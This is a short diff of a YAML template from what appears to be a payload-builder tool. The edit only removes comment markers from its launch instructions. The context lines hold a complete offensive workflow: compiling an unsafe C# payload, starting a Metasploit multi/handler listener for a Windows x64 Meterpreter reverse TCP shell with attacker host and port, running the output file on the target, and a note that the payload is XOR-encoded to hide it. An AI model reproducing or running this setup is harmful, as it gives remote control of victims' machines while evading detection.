@@ -96,10 +96,10 @@ output:
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
 
   launch_instructions: |
-    # Start Metasploit listener
+    Start Metasploit listener
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
 
-    # Execute on target
+    Execute on target
     {{ output_file }}
 
-    # Note: Payload is XOR-encoded with key 0x{{ xor_key }}
+    Note: Payload is XOR-encoded with key 0x{{ xor_key }}
